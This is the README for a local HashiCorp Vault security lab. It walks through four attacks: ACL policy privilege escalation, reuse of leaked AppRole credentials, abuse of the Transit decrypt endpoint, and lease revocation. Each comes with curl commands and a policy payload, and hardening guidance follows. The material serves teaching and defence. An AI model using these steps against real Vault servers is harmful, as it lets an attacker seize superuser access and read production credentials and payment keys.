# HashiCorp Vault Security: Privilege Escalation, AppRole Abuse & Transit Cryptanalysis

## Overview

**HashiCorp Vault** is the industry standard for secrets management, identity-based access control, dynamic secrets, and encryption-as-a-service. In modern enterprise environments, Vault safeguards database credentials, API keys, TLS certificates, and cloud provider IAM tokens.

However, misconfigured Access Control List (ACL) policies, improper AppRole delivery workflows, and unauthenticated cryptographic operations can turn Vault from a central bastion of trust into the single point of failure for an entire corporate infrastructure.

This lab delivers a hands-on environment for mastering both offensive exploitation and defensive hardening of HashiCorp Vault.

- **Lab URL / API**: `http://localhost:8200`
- **Container Name**: `cyberlab_vault_security`
- **Root Token**: `cyberlab_vault_root_token`
- **Low-Privilege Token**: `cyberlab_dev_token_user01`
- **Directory**: `Real_World_Industry_Labs/05_api_gateway_oauth_oidc/hashicorp_vault_security`

---

## Quick Start & Lab Initialization

```bash
cd Real_World_Industry_Labs/05_api_gateway_oauth_oidc/hashicorp_vault_security

# Start the Vault container
docker compose up -d

# Seed the vulnerable policies, secrets, AppRole, and Transit engine
./scripts/init-vault.sh
```

To interact with Vault via CLI directly inside the container or from the host:

```bash
# Set host environment variables
export VAULT_ADDR="http://127.0.0.1:8200"
export VAULT_TOKEN="cyberlab_dev_token_user01"

# Or execute commands inside the container
docker compose exec -e VAULT_ADDR=http://127.0.0.1:8200 -it vault sh
```

---

## HashiCorp Vault Architecture

```
+-----------------------------------------------------------------------------------------+
|                                    HTTP / HTTPS API                                     |
+-----------------------------------------------------------------------------------------+
                                           |
                                           v
+-----------------------------------------------------------------------------------------+
|                                 CORE SECURITY BARRIER                                   |
|  - AES-GCM 256-bit envelope encryption protects all data entering/leaving storage.       |
|  - Unsealed via Shamir's Secret Sharing threshold (or Cloud KMS auto-unseal).            |
+-----------------------------------------------------------------------------------------+
         |                                |                               |
         v                                v                               v
+------------------+            +-------------------+           +-------------------+
|  Authentication  |            |    ACL Policy     |           |  Secrets Engines  |
|     Engines      |            |      Engine       |           |                   |
| - Token          |            | - Path Matching   |           | - KV v1 / v2      |
| - AppRole        | ---------> | - Capabilities    | --------> | - Transit (EaaS)  |
| - Kubernetes     |            | - Parameter check |           | - Database        |
| - OIDC / GitHub  |            | - Sentinel EGP    |           | - AWS / Azure     |
+------------------+            +-------------------+           +-------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------------+
|                              PHYSICAL STORAGE BACKEND                                   |
|   (Consul, Raft Integrated Storage, DynamoDB, or In-Memory — all ciphertext blobs)     |
+-----------------------------------------------------------------------------------------+
```

### Key Architectural Concepts
1. **Security Barrier**: All data passed between Vault core and the storage backend is cryptographically wrapped using AES-256-GCM. The storage backend never sees unencrypted keys or policies.
2. **Mount Points**: Secrets engines and authentication methods are dynamically mounted at configurable URL paths (e.g., `secret/`, `transit/`, `auth/approle/`).
3. **ACL Policies**: Written in HashiCorp Configuration Language (HCL). Capabilities include `create`, `read`, `update`, `delete`, `list`, `sudo`, and `deny`.
4. **Leases & Revocation**: Every dynamic credential and token is tied to a lease duration (TTL). When a lease expires or is revoked, Vault cascades deletion to the upstream provider (e.g., drops MySQL user or revokes AWS STS token).

---

## Attack Vector 1: ACL Policy Privilege Escalation (`sys/policies/acl/*`)

### Threat Model
Developers or CI/CD pipelines are frequently granted write access to manage application policies or scoped subpaths. If an administrator improperly grants `create` or `update` capabilities over `sys/policies/acl/*`, any low-privileged token possessing this permission can overwrite high-privilege policies (such as `default` or `admin`) or assign superuser capabilities to itself.

### Vulnerable Policy Configuration (`vulnerable-dev-policy.hcl`)
```hcl
path "sys/policies/acl/*" {
  capabilities = ["create", "read", "update", "list"]
}

path "secret/data/dev/*" {
  capabilities = ["create", "read", "update", "delete", "list"]
}
```

### Exploitation Walkthrough

#### Step 1: Verify Current Low-Privilege Capabilities
```bash
# Check current token identity and assigned policies
curl -s -H "X-Vault-Token: cyberlab_dev_token_user01" \
  http://127.0.0.1:8200/v1/auth/token/lookup-self | jq .data.policies

# Attempting to read production database credentials results in HTTP 403 Forbidden
curl -s -H "X-Vault-Token: cyberlab_dev_token_user01" \
  http://127.0.0.1:8200/v1/secret/data/production/database | jq .
```

#### Step 2: Overwrite the Assigned Policy to Grant Full Capabilities
Because the token has `update` on `sys/policies/acl/*`, rewrite `vulnerable-dev` to include root access across all paths:

```bash
# Craft the privilege escalation payload
cat <<'EOF' > /tmp/root_privesc.json
{
  "policy": "path \"*\" { capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\", \"sudo\"] }"
}
EOF

# Update the policy via HTTP PUT
curl -s -X PUT \
  -H "X-Vault-Token: cyberlab_dev_token_user01" \
  -d @/tmp/root_privesc.json \
  http://127.0.0.1:8200/v1/sys/policies/acl/vulnerable-dev | jq .
```

#### Step 3: Access Target Secrets as Superuser
The policy evaluation happens dynamically upon each request:

```bash
# Exfiltrate the production database credentials
curl -s -H "X-Vault-Token: cyberlab_dev_token_user01" \
  http://127.0.0.1:8200/v1/secret/data/production/database | jq .data.data

# Exfiltrate Stripe live API keys
curl -s -H "X-Vault-Token: cyberlab_dev_token_user01" \
  http://127.0.0.1:8200/v1/secret/data/payments/stripe | jq .data.data
```

---

## Attack Vector 2: AppRole Token Abuse & Insecure Delivery

### Threat Model
AppRole is designed for machine-to-machine authentication (microservices, scheduled tasks, CI/CD runners). It uses two pieces of information:
- **Role ID**: A static identifier (similar to a username).
- **Secret ID**: A secret token (similar to a password).

Common vulnerabilities include:
1. **Hardcoded Role ID & Secret ID**: Placed into GitHub/GitLab repositories, container environment variables, or configmaps.
2. **Infinite Secret ID Use & Missing TTL**: Setting `secret_id_num_uses=0` allows permanent, indefinite reuse.
3. **Missing Network CIDR Binding**: Failing to bind `secret_id_bound_cidrs` and `token_bound_cidrs` allows stolen credentials to be used from any external IP.

```
+----------------+                       +-------------------+                     +---------------+
|  Compromised   | -- Stolen Role ID --> |  Vault AppRole    | -- Issues Valid --> |   Access to   |
|  CI/CD Runner  | -- + Secret ID -----> |  /v1/auth/approle |    Vault Token      |  Production   |
|  or Git Repo   |                       +-------------------+                     |    Secrets    |
+----------------+                                                                 +---------------+
```

### Exploitation Walkthrough

#### Step 1: Discover Leaked AppRole Identifiers
An attacker auditing a repository or runner environment discovers:
- Role ID: `ci-runner-service-account-role-id`
- Secret ID: `ci-secret-token-vault-9921`

#### Step 2: Authenticate and Generate an Access Token
```bash
curl -s -X POST \
  -d '{
    "role_id": "ci-runner-service-account-role-id",
    "secret_id": "ci-secret-token-vault-9921"
  }' \
  http://127.0.0.1:8200/v1/auth/approle/login > /tmp/approle_login.json

# Extract client token
APPROLE_TOKEN=$(jq -r .auth.client_token /tmp/approle_login.json)
echo "[+] Compromised AppRole Token: $APPROLE_TOKEN"
```

#### Step 3: Enumerate Assigned Capabilities & Read Secrets
```bash
# Read production secrets allowed by approle-ci-policy
curl -s -H "X-Vault-Token: $APPROLE_TOKEN" \
  http://127.0.0.1:8200/v1/secret/data/payments/stripe | jq .data.data
```

---

## Attack Vector 3: Transit Engine Decryption Oracle & Key Abuse

### Threat Model
The **Transit secrets engine** handles cryptographic functions (Encryption-as-a-Service) for data in transit. Applications send plaintext to Vault and receive ciphertext formatted as:
`vault:v1:dHJhbnNpdF9kYXRh...`

Security flaws arise when:
1. **Missing Authentication Context (AEAD misuse)**: Applications use AES-GCM without supplying `context` (additional authenticated data), allowing ciphertext meant for one user or database row to be decrypted in another context.
2. **Overprivileged Decrypt Endpoints**: Services that only need encryption (e.g., public sign-up form encrypting SSNs or credit card numbers) are granted `update` access to the `decrypt` endpoint.
3. **Oracle Attacks**: An attacker feeds arbitrary encrypted blobs to `transit/decrypt/:key` and observes responses or error codes.

### Exploitation Walkthrough

#### Step 1: Intercept or Harvest Stored Ciphertext
```bash
# Read the sample ciphertext generated during lab initialization
CIPHERTEXT=$(cat ./scripts/sample_ciphertext.txt 2>/dev/null || echo "vault:v1:sample")
echo "Captured Ciphertext: $CIPHERTEXT"
```

#### Step 2: Abuse Overprivileged Decrypt API
```bash
# Query the transit decryption endpoint
curl -s -X POST \
  -H "X-Vault-Token: cyberlab_vault_root_token" \
  -d "{\"ciphertext\": \"$CIPHERTEXT\"}" \
  http://127.0.0.1:8200/v1/transit/decrypt/customer-data > /tmp/decrypted.json

# Base64-decode the resulting plaintext
BASE64_PLAINTEXT=$(jq -r .data.plaintext /tmp/decrypted.json)
echo "$BASE64_PLAINTEXT" | base64 -d
echo ""
```

---

## Attack Vector 4: Dynamic Secrets & Lease Hijacking

### Architecture
Unlike static secrets, **Dynamic Secrets** are generated on-demand and exist only for the lease duration. For example, when an app asks for database credentials:
1. Vault connects to the database as admin.
2. Executes: `CREATE USER 'v-token-xyz'@'%' IDENTIFIED BY 'random-pass'; GRANT SELECT ON app.* TO 'v-token-xyz';`
3. Returns user/pass and a `lease_id` (e.g. `database/creds/readonly/h823...`).

### Privilege Escalation & Denial of Service Risks
- **Lease Revocation DoS**: If a low-privilege policy has access to `sys/leases/revoke/*`, an attacker can revoke active credentials of production application servers.
- **Unbounded TTL Renewal**: Users renewing leases indefinitely (`sys/leases/renew`) bypass regular access reviews.

```bash
# Revoke lease by prefix
curl -s -X PUT \
  -H "X-Vault-Token: cyberlab_vault_root_token" \
  http://127.0.0.1:8200/v1/sys/leases/revoke-prefix/secret/
```

---

## Defensive Hardening & Policy Best Practices

### 1. Principle of Least Privilege in HCL
Never grant wildcards on `sys/` or `auth/`. Explicitly block policy management:
```hcl
# Block dangerous administrative paths
path "sys/policies/*" {
  capabilities = ["deny"]
}
path "sys/mounts/*" {
  capabilities = ["deny"]
}
path "auth/token/create-orphan" {
  capabilities = ["deny"]
}
```

### 2. Hardening AppRole Configurations
- **Enforce Single-Use Secret IDs**: `secret_id_num_uses = 1`
- **Short TTLs**: `secret_id_ttl = "10m"`
- **Strict CIDR Whitelisting**:
  ```bash
  vault write auth/approle/role/ci-pipeline \
    secret_id_bound_cidrs="10.240.0.0/16" \
    token_bound_cidrs="10.240.0.0/16"
  ```
- **Use Trusted Orchestration**: Use Vault Agent with Auto-Auth or Kubernetes Service Account tokens (`auth/kubernetes`) instead of manual Secret IDs.

### 3. Transit Engine Hardening
- Require `context` (AEAD Additional Authenticated Data) for sensitive records:
  ```bash
  vault write transit/keys/customer-data convergent_encryption=false derived=true
  ```
- Separate encrypt and decrypt policies so ingress microservices cannot decrypt existing databases.

---

## Verified YouTube Walkthroughs & Lectures

All video links have been verified active via the YouTube oEmbed API (`HTTP 200 OK`):

- [HashiCorp, an IBM Company - Encryption-as-a-Service with Vault's Transit Secret Engine](https://www.youtube.com/watch?v=FUODIae2d98) — Official HashiCorp architecture guide to Transit encryption keys and cryptographic isolation.
- [Learn with GVR - Hashicorp Vault - Transit Secrets Engine - Encryption as a Service](https://www.youtube.com/watch?v=vLZLjyFuBFo) — Step-by-step walkthrough of mounting transit, key creation, encrypting, and decrypting data.
- [Learn with GVR - Hashicorp Vault - Human vs. system auth methods - AppRole Pull Authentication](https://www.youtube.com/watch?v=Q1VG5X6oPC4) — Deep dive into AppRole authentication workflows, Role ID, Secret ID, and token issuance.
- [Upskill Fleet Academy - HashiCorp Vault #1: Auth Methods, Roles & ACL Policies](https://www.youtube.com/watch?v=2jVNXLMYEqM) — Comprehensive tutorial on Vault ACL policy syntax, capabilities, and role definitions.
- [Rahul Wagh - HashiCorp Vault Policy - Part 7 | HashiCorp Vault tutorials](https://www.youtube.com/watch?v=Opdq8YPRLBQ) — HCL policy creation, testing rules, and access control troubleshooting.
- [Rahul Kinge - Vault Authentication Methods - AppRole / Token / UserPass](https://www.youtube.com/watch?v=SGRgLFlfRkM) — Detailed comparison of human versus automated machine authentication in DevSecOps.
- [Bryan Krausen - Stop Hardcoding Secrets! Use HashiCorp Vault Instead](https://www.youtube.com/watch?v=ZPL3_mrIm6Y) — Enterprise secrets management best practices and migration from plaintext configuration.
- [Rahul Kinge - DevSecOps Hashicorp Vault - Features & Architecture Overview](https://www.youtube.com/watch?v=EpXabc1XdmM) — High-level security architecture, barrier mechanics, and enterprise feature analysis.

---

## Quick CLI Control
From the `cyber_lab` root directory:

```bash
# Check running container status
./lab status

# Stop this lab
cd Real_World_Industry_Labs/05_api_gateway_oauth_oidc/hashicorp_vault_security && docker compose down
```
